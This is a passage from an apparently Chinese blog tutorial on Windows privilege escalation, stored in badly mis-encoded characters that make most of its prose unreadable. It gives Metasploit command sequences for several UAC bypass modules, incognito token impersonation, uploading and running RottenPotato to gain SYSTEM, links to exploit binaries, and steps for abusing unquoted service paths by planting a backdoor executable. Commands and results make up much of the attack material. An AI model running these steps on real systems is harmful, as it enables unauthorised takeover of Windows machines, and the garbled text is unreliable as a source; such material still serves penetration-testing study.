2008æ“ä½œç³»ç»Ÿå¼•å…¥äº†ä¸€ç§è‰¯å¥½çš„ç”¨æˆ·å¸æˆ·æ§åˆ¶æ¶æ„ï¼Œä»¥é˜²æ­¢ç³»ç»ŸèŒƒå›´å†…çš„æ„å¤–æ›´æ”¹ï¼Œè¿™ç§æ›´æ”¹æ˜¯å¯ä»¥é¢„è§çš„ï¼Œå¹¶ä¸”åªéœ€è¦å¾ˆå°‘çš„æ“ä½œé‡ã€‚</p><p>æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯Windowsçš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œå®ƒæ”¯æŒé˜²æ­¢å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ï¼ŒUACç¡®ä¿ä»…åœ¨ç®¡ç†å‘˜æˆæƒçš„æƒ…å†µä¸‹è¿›è¡ŒæŸäº›æ›´æ”¹ã€‚å¦‚æœç®¡ç†å‘˜ä¸å…è®¸æ›´æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œè¿™äº›æ›´æ”¹ï¼Œå¹¶ä¸”Windowsç³»ç»Ÿä¿æŒä¸å˜ã€‚</p><p><strong>2.UACå¦‚ä½•è¿è¡Œï¼Ÿ</strong></p><p>UACé€šè¿‡é˜»æ­¢ç¨‹åºæ‰§è¡Œä»»ä½•æ¶‰åŠæœ‰å…³ç³»ç»Ÿæ›´æ”¹/ç‰¹å®šä»»åŠ¡çš„ä»»åŠ¡æ¥è¿è¡Œã€‚é™¤éå°è¯•æ‰§è¡Œè¿™äº›æ“ä½œçš„è¿›ç¨‹ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œå¦åˆ™è¿™äº›æ“ä½œå°†æ— æ³•è¿è¡Œã€‚å¦‚æœæ‚¨ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œç¨‹åºï¼Œåˆ™å®ƒå°†å…·æœ‰æ›´å¤šæƒé™ï¼Œå› ä¸ºå®ƒå°†è¢«â€æå‡æƒé™â€ï¼Œè€Œä¸æ˜¯ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œçš„ç¨‹åºã€‚</p><p>ä¸€äº›æ²¡æœ‰ç®¡ç†å‘˜æƒé™æ— æ³•å®Œæˆçš„æ“ä½œï¼š</p><ul><li>æ³¨å†Œè¡¨ä¿®æ”¹ï¼ˆå¦‚æœæ³¨å†Œè¡¨é¡¹åœ¨HKEY_LOCAL_MACHINEä¸‹ï¼ˆå› ä¸ºå®ƒå½±å“å¤šä¸ªç”¨æˆ·ï¼‰ï¼Œå®ƒå°†æ˜¯åªè¯»çš„ï¼‰</li><li>åŠ è½½è®¾å¤‡é©±åŠ¨ç¨‹åº</li><li>DLLæ³¨å…¥</li><li>ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼ˆæ—¶é’Ÿï¼‰</li><li>ä¿®æ”¹ç”¨æˆ·å¸æˆ·æ§åˆ¶è®¾ç½®ï¼ˆé€šè¿‡æ³¨å†Œè¡¨ï¼Œå¯ä»¥å¯ç”¨/ç¦ç”¨è¯¥è®¾ç½®ï¼Œä½†æ‚¨éœ€è¦æ­£ç¡®çš„æƒé™æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œï¼‰</li><li>ä¿®æ”¹å—ä¿æŠ¤çš„ç›®å½•ï¼ˆä¾‹å¦‚Windowsæ–‡ä»¶å¤¹ï¼ŒProgram Filesï¼‰</li><li>è®¡åˆ’ä»»åŠ¡ï¼ˆä¾‹å¦‚ï¼Œä»¥ç®¡ç†å‘˜æƒé™è‡ªåŠ¨å¯åŠ¨ï¼‰</li></ul><p><strong>UACä¸ä¼šè‡ªåŠ¨é˜»æ­¢æ¶æ„è½¯ä»¶ï¼Œå…¶ç›®çš„ä¸æ˜¯ç¡®å®šç¨‹åºæ˜¯å¦æ˜¯æ¶æ„è½¯ä»¶ã€‚è¿™åŒæ ·å–å†³äºç”¨æˆ·ã€‚å¦‚æœå°†ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œç¨‹åºï¼Œåˆ™å°†æé†’ç”¨æˆ·å¹¶ä¸”éœ€è¦ç”¨æˆ·ç¡®è®¤ã€‚</strong> </p><p><strong>ä¸€èˆ¬æˆ‘ä»¬é€šè¿‡msfæ‹¿åˆ°meterprterçš„ä¼šè¯åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡getsystemæˆ–è€…getuidæ¥æ£€æŸ¥æ˜¯å¦æ˜¯systemæƒé™</strong></p><p>å¦‚æœä¸æ˜¯systemæƒé™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ç»•è¿‡UACæ¨¡å—å¯¹UACè¿›è¡Œç»•è¿‡ï¼Œåœ¨é€šè¿‡<strong>getsystemè¿›è¡Œææƒ</strong></p><pre><code class="text">#Msfexploit/windows/local/ask #å¼¹å‡ºUACç¡®è®¤çª—å£ï¼Œç‚¹å‡»åè·å¾—systemæƒé™exploit/windows/local/bypassuacexploit/windows/local/bypassuac_injectionexploit/windows/local/bypassuac_fodhelperexploit/windows/local/bypassuac_eventvwrexploit/windows/local/bypassuac_comhijack</code></pre><h3 id="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤"><a href="#Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤" class="headerlink" title="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤"></a><strong>Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤</strong></h3><p>æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit</code></pre><p>ä»ç»™å®šçš„meterpreterä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°meterpreterä¼šè¯2å·²æ‰“å¼€ï¼Œç°åœ¨ä»¥ä¸‹å‘½ä»¤ä»¥ç¡®å®šsystemæƒé™ç‰¹æƒ.</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235547978.png" alt="image-20220312235547978"></p><h3 id="Windowsæƒé™æå‡ç»•è¿‡UACä¿æŠ¤ï¼ˆå†…å­˜æ³¨å…¥ï¼‰"><a href="#Windowsæƒé™æå‡ç»•è¿‡UACä¿æŠ¤ï¼ˆå†…å­˜æ³¨å…¥ï¼‰" class="headerlink" title="Windowsæƒé™æå‡ç»•è¿‡UACä¿æŠ¤ï¼ˆå†…å­˜æ³¨å…¥ï¼‰"></a><strong>Windowsæƒé™æå‡ç»•è¿‡UACä¿æŠ¤ï¼ˆå†…å­˜æ³¨å…¥ï¼‰</strong></h3><p>æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»çš„å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚åœ¨æ™®é€šæŠ€æœ¯ä¸­ï¼Œè¯¥æ¨¡å—ä½¿ç”¨åå°„å¼DLLæ³¨å…¥æŠ€æœ¯å¹¶åªé™¤å»äº†DLL payload  äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸‰ä¸ªå•ç‹¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå®ƒéœ€è¦é€‰æ‹©æ­£ç¡®çš„ä½“ç³»æ¶æ„ï¼ˆå¯¹äºSYSWOW64ç³»ç»Ÿä¹Ÿä½¿ç”¨x64ï¼‰ã€‚å¦‚æœæŒ‡å®šexe::customï¼Œåº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨ payload åè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235641548.png" alt="image-20220312235641548"></p><h3 id="ç»•è¿‡Windows-UACä¿æŠ¤ï¼ˆé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹ï¼‰"><a href="#ç»•è¿‡Windows-UACä¿æŠ¤ï¼ˆé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹ï¼‰" class="headerlink" title="ç»•è¿‡Windows UACä¿æŠ¤ï¼ˆé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹ï¼‰"></a><strong>ç»•è¿‡Windows UACä¿æŠ¤ï¼ˆé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹ï¼‰</strong></h3><p>æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windows fodhelper.exeåº”ç”¨ç¨‹åºæ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows 10 UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåå°†æ¸…é™¤è¯¥é¡¹ã€‚è¯¥æ¨¡å—ä¸éœ€è¦payloadçš„ä½“ç³»æ¶æ„å’Œæ“ä½œç³»ç»ŸåŒ¹é…ã€‚å¦‚æœæŒ‡å®šexe:customï¼Œåˆ™åº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235727956.png" alt="image-20220312235727956"></p><h3 id="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹ï¼‰"><a href="#Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹ï¼‰" class="headerlink" title="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹ï¼‰"></a><strong>Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹ï¼‰</strong></h3><p>æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windowsäº‹ä»¶æŸ¥çœ‹å™¨æ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåå°†æ¸…é™¤è¯¥é¡¹ã€‚è¯¥æ¨¡å—ä¸éœ€è¦payloadçš„ä½“ç³»æ¶æ„å’Œæ“ä½œç³»ç»ŸåŒ¹é…ã€‚å¦‚æœæŒ‡å®šEXE ::Customï¼Œåˆ™åº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235806004.png" alt="image-20220312235806004"></p><h3 id="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒï¼‰"><a href="#Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒï¼‰" class="headerlink" title="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒï¼‰"></a><strong>Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒï¼‰</strong></h3><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235844933.png" alt="image-20220312235844933"></p><h2 id="ä»¤ç‰Œçªƒå–"><a href="#ä»¤ç‰Œçªƒå–" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a><strong>ä»¤ç‰Œçªƒå–</strong></h2><p><strong>é€‚ç”¨äº2008ä¹‹å‰ç‰ˆæœ¬</strong></p><p><strong>ä»¤ç‰Œç®€ä»‹</strong></p><p>æè¿°è¿›ç¨‹æˆ–è€…çº¿ç¨‹å®‰å…¨ä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå¯¹è±¡ã€‚ä¸åŒçš„ç”¨æˆ·ç™»å½•è®¡ç®—æœºåï¼Œ éƒ½ä¼šç”Ÿæˆä¸€ä¸ªAccess Tokenï¼Œè¿™ä¸ªTokenåœ¨ç”¨æˆ·åˆ›å»ºè¿›ç¨‹æˆ–è€…çº¿ç¨‹æ—¶ä¼šè¢«ä½¿ç”¨ï¼Œä¸æ–­çš„æ‹·è´ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†Aç”¨æˆ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹è€Œè¯¥è¿›ç¨‹æ²¡æœ‰Bç”¨æˆ·çš„æƒé™ã€‚ä¸€èˆ¬ç”¨æˆ·åŒå‡»è¿è¡Œä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šæ‹·è´explorer.exeçš„Access Tokenã€‚è®¿é—®ä»¤ç‰Œåˆ†ä¸ºï¼š</p><p>* æˆæƒä»¤ç‰Œï¼ˆDelegation tokenï¼‰ï¼šäº¤äº’å¼ä¼šè¯ç™»é™†ï¼ˆä¾‹ï¼šæœ¬åœ°ç”¨æˆ·ç™»é™†ã€ç”¨æˆ·æ¡Œé¢ç­‰ï¼‰</p><p>* æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆImpersonation tokenï¼‰ï¼šéäº¤äº’å¼ç™»é™†ï¼ˆä¾‹ï¼šnet use è®¿é—®å…±äº«æ–‡ä»¶ï¼‰</p><p>ä¸¤ç§tokenåªæœ‰åœ¨ç³»ç»Ÿé‡å¯åæ‰ä¼šæ¸…é™¤ï¼›æˆæƒä»¤ç‰Œåœ¨ç”¨æˆ·æ³¨é”€åï¼Œè¯¥ä»¤ç‰Œä¼šå˜ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œä¾æ—§æœ‰æ•ˆã€‚</p><p>åŒæ ·ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼Œ<strong>å½“å‰ç³»ç»Ÿä¸­çš„æŸä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹èƒ½è®¿é—®åˆ°ä»€ä¹ˆæ ·çš„ç³»ç»Ÿèµ„æº,å®Œå…¨å–å†³äºä½ å½“å‰è¿›ç¨‹æ˜¯æ‹¿ç€è°çš„ä»¤ç‰Œã€‚</strong></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆ—ä¸¾ä»¤ç‰Œï¼Œåªèƒ½åˆ—ä¸¾å‡ºå½“å‰ç”¨æˆ·å’Œæ¯”å½“å‰ç”¨æˆ·æƒé™æ›´ä½ç”¨æˆ·çš„ä»¤ç‰Œã€‚ä»¤ç‰Œçš„æ•°é‡å–å†³äºå½“å‰shellçš„è®¿é—®çº§åˆ«ï¼Œå¦‚æœå½“å‰çš„æƒé™æ˜¯ä¸€ä¸ªæ™®é€šåŸŸç”¨æˆ·ï¼Œæ‰€ä»¥ä»¤ç‰Œçªƒå–åªèƒ½çªƒå–åˆ°å½“å‰ç”¨æˆ·æœ¬èº«æ˜¯ã€‚å¦‚æœå½“å‰çš„shellæ˜¯administratoræˆ–è€…æ˜¯systemï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ç³»ç»Ÿä¸­çš„æ‰€æœ‰çš„ä»¤ç‰Œã€‚</p><p><strong>æ”»å‡»æ–¹æ³•</strong></p><p><strong>ç¬¬ä¸€ç§é¦–å…ˆæå‰è·å–ä¸€ä¸ªsession</strong></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -umeterpreter &gt; impersonate_token WIN-2HU3N1\\Administrator #æ³¨æ„ï¼šè¿™é‡Œæ˜¯ä¸¤ä¸ªåæ–œæ \\</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220313002103573.png" alt="image-20220313002103573"></p><p><strong>ç¬¬äºŒç§å€Ÿç”¨Rotten potatoç¨‹åº</strong></p><p>é“¾æ¥:<a href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -uWIN-2HU3N1\Administratormeterpreter &gt; upload /root/Rottenpotato/rottenpotato.exeSuccessfullymeterpreter &gt; execute -HC -f rottenpotato.exeSuccessfullymeterpreter &gt; getuid...NT AUTHORITY\SYSTEM</code></pre><h2 id="çƒ‚åœŸè±†ææƒ-MS16-075"><a href="#çƒ‚åœŸè±†ææƒ-MS16-075" class="headerlink" title="çƒ‚åœŸè±†ææƒ-MS16-075"></a><strong>çƒ‚åœŸè±†ææƒ-MS16-075</strong></h2><p><strong>ä¸€èˆ¬çƒ‚åœŸè±†éœ€è¦æ¥é…åˆä»¤ç‰Œçªƒå–æ¥è¿›è¡Œææƒ</strong></p><p><strong>æ³¨æ„ï¼ˆé‡ç‚¹ï¼šç”¨çƒ‚åœŸè±†é…åˆæœ¬åœ°ç”¨æˆ·ææƒæ˜¯æˆåŠŸä¸äº†çš„ï¼Œå¿…é¡»æ˜¯webæƒé™æˆ–æ•°æ®åº“æƒé™ï¼‰</strong></p><ol><li>å•çº¯ä»¤ç‰Œçªƒå–ï¼šWebæƒé™æˆ–æœ¬åœ°æƒé™</li><li>é…åˆçƒ‚åœŸè±†ææƒï¼šwebæƒé™æˆ–æ•°æ®åº“ç­‰æƒé™</li></ol><p><strong>çƒ‚åœŸè±†ææƒåŸç†</strong></p><ol><li>æ¬ºéª— â€œNT AUTHORITY\SYSTEMâ€è´¦æˆ·é€šè¿‡NTLMè®¤è¯åˆ°æˆ‘ä»¬æ§åˆ¶çš„TCPç»ˆç«¯ã€‚</li><li>å¯¹è¿™ä¸ªè®¤è¯è¿‡ç¨‹ä½¿ç”¨ä¸­é—´äººæ”»å‡»ï¼ˆNTLMé‡æ”¾ï¼‰ï¼Œä¸ºâ€NT AUTHORITY\SYSTEMâ€è´¦æˆ·æœ¬åœ°åå•†ä¸€ä¸ªå®‰å…¨ä»¤ç‰Œã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡ä¸€ç³»åˆ—çš„Windows APIè°ƒç”¨å®ç°çš„ã€‚</li><li>æ¨¡ä»¿è¿™ä¸ªä»¤ç‰Œã€‚åªæœ‰å…·æœ‰â€æ¨¡ä»¿å®‰å…¨ä»¤ç‰Œæƒé™â€çš„è´¦æˆ·æ‰èƒ½å»æ¨¡ä»¿åˆ«äººçš„ä»¤ç‰Œã€‚ä¸€èˆ¬å¤§å¤šæ•°çš„æœåŠ¡å‹è´¦æˆ·ï¼ˆIISã€MSSQLç­‰ï¼‰æœ‰è¿™ä¸ªæƒé™ï¼Œå¤§å¤šæ•°ç”¨æˆ·çº§çš„è´¦æˆ·æ²¡æœ‰è¿™ä¸ªæƒé™ã€‚</li></ol><p>æ‰€ä»¥ï¼Œä¸€èˆ¬ä»webæ‹¿åˆ°çš„webshelléƒ½æ˜¯IISæœåŠ¡å™¨æƒé™ï¼Œæ˜¯å…·æœ‰è¿™ä¸ªæ¨¡ä»¿æƒé™çš„ã€‚æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°ä½¿ç”¨å·²ç»å»ºå¥½çš„è´¦æˆ·ï¼ˆå°±æ˜¯ä¸Šé¢è¯´çš„ç”¨æˆ·çº§è´¦æˆ·ï¼‰å»åå¼¹meterpreterç„¶åå†å»æ‰§è¡ŒEXPçš„æ—¶å€™ä¼šå¤±è´¥ï¼Œä½†ä½¿ç”¨èœåˆ€ï¼ˆIISæœåŠ¡å™¨æƒé™ï¼‰åå¼¹meterpreterå°±ä¼šæˆåŠŸã€‚</p><p><strong>æ”»å‡»æ–¹æ³•</strong></p><pre><code class="text">meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exemeterpreter &gt; execute -HC -f rottenpotato.exemeterpreter &gt; use incognitometerpreter &gt; list_tokens -u</code></pre><p>ä¼šå‘ç°ä»¤ç‰Œåˆ—è¡¨é‡Œé¢å­˜åœ¨systemçš„ä»¤ç‰Œï¼Œåœ¨ç”¨systemçš„ä»¤ç‰Œè¿›è¡Œææƒ</p><p>Juicy Potatoçš„é™åˆ¶æ¡ä»¶å¦‚ä¸‹ï¼š</p><p>1ã€éœ€è¦æ”¯æŒSeImpersonateæˆ–è€…SeAssignPrimaryTokenæƒé™<br>2ã€å¼€å¯DCOM<br>3ã€æœ¬åœ°æ”¯æŒRPCæˆ–è€…è¿œç¨‹æœåŠ¡å™¨æ”¯æŒPRCå¹¶èƒ½æˆåŠŸç™»å½•<br>4ã€èƒ½å¤Ÿæ‰¾åˆ°å¯ç”¨çš„COMå¯¹è±¡</p><p>ä¸€èˆ¬ä»webæ‹¿åˆ°çš„webshelléƒ½æ˜¯IISæœåŠ¡å™¨æƒé™ï¼Œæ˜¯å…·æœ‰è¿™ä¸ªæ¨¡ä»¿æƒé™çš„ã€‚ä¸€èˆ¬å¤§å¤šæ•°çš„æœåŠ¡å‹è´¦æˆ·IISã€MSSQLç­‰ï¼Œæœ‰è¿™ä¸ªæƒé™ï¼Œå¤§å¤šæ•°ç”¨æˆ·çº§çš„è´¦æˆ·æ²¡æœ‰è¿™ä¸ªæƒé™ï¼Œè¿™äº›éƒ½å¯ä»¥whoami /priv è¯•ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ¨¡ä»¿æƒé™ã€‚</p><p><strong>çƒ‚åœŸè±†ç‰ˆæœ¬</strong></p><p>RottonPatatoè„šæœ¬ï¼š</p><ol><li><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li><li><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li><li><a href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></li></ol><h2 id="å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"><a href="#å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´" class="headerlink" title="å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"></a><strong>å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´</strong></h2><p><strong>å¦‚æœä¸€ä¸ªæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ²¡æœ‰è¢«åŒå¼•å·å¼•èµ·æ¥ä¸”åŒ…å«ç©ºæ ¼ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°±æ˜¯æœ‰æ¼æ´çš„</strong></p><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>è¿™é‡Œå‡è®¾æœ‰ä¸€ä¸ªæœåŠ¡è·¯å¾„ C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</p><ol><li>å¸¦å¼•å·æ—¶ï¼šâ€C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exeâ€ä¼šè¢«çœ‹æˆä¸€ä¸ªå®Œæ•´çš„æœåŠ¡è·¯å¾„ï¼Œæ•…ä¸ä¼šäº§ç”Ÿæ¼æ´ã€‚</li><li>ä¸å¸¦å¼•å·æ—¶ï¼šæˆ‘ä»¬è®¤ä¸ºçš„æœåŠ¡è·¯å¾„æ˜¯C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exeï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰åŒå¼•å·çš„åŒ…è£¹ï¼ŒWindowsä¼šè®¤ä¸ºC:\Programç©ºæ ¼åé¢çš„ä¸ºProgramè¿™ä¸ªç¨‹åºçš„å‚æ•°æ¥è¿›è¡Œå¯åŠ¨æœåŠ¡ã€‚è¿™æ ·æ”»å‡»è€…å°±å¯ä»¥å‘½åä¸€ä¸ªä¸ºProgram.exeçš„åé—¨æ–‡ä»¶æ”¾åœ¨cç›˜ä¸‹ï¼Œè¿›è€Œç­‰å¾…å«æ¼æ´æœåŠ¡è·¯å¾„çš„å¯åŠ¨æˆ–é‡å¯å¯¼è‡´åé—¨æ–‡ä»¶çš„æ‰§è¡Œã€‚</li></ol><h3 id="æ”»å‡»æ–¹æ³•"><a href="#æ”»å‡»æ–¹æ³•" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h3><p>å¯»æ‰¾å­˜åœ¨æ¼æ´çš„æœåŠ¡</p><pre><code class="text">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.png" alt="img"></p><p>æŠŠæˆ‘ä»¬åé—¨æ–‡ä»¶é‡å‘½åæ”¾åœ¨å¯¹åº”çš„æ–‡ä»¶è·¯å¾„ä¸‹</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.png" alt="img"></p><p>  åœ¨msfä¸Šè¿›è¡Œç›‘å¬ï¼Œç„¶åå¯åŠ¨å¯¹åº”æœåŠ¡</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.png" alt="img"></p><p>æ¥æ”¶åˆ°shellï¼Œä¸”æ˜¯systemæƒé™</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.png" alt="img"></p><pre><code class="text">#msfæ£€æµ‹æ”»å‡»æ¨¡å—exploit/windows/local/unquoted_service_path#æ­£å¸¸æ¥æ”¶åˆ°ä¼šè¯åï¼Œä¸ä¹…å°±ä¼šè‡ªåŠ¨æ–­å¼€è¿æ¥ï¼Œéœ€è¦å¼€å¯å‘½ä»¤è‡ªåŠ¨è¿ç§»è¿›ç¨‹set AutoRunScript migrate -f</code></pre><pre><code class="text">#æ‰‹åŠ¨æ”»å‡»æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„exeæ ¹æ®éœ€è¦é‡å‘½åå¹¶æ”¾ç½®åœ¨å¯å†™å…¥çš„æœ‰æ¼æ´ç›®å½•ä¸‹ç„¶åé‡å¯æœåŠ¡sc stop service_namesc start service_name</code></pre><h2 id="ä¸å®‰å…¨æœåŠ¡æƒé™é…åˆè®¡åˆ’ä»»åŠ¡schtasksæˆ–SCå‘½ä»¤åˆ©ç”¨"><a href="#ä¸å®‰å…¨æœåŠ¡æƒé™é…åˆè®¡åˆ’ä»»åŠ¡schtasksæˆ–SCå‘½ä»¤åˆ©ç”¨" class="headerlink" 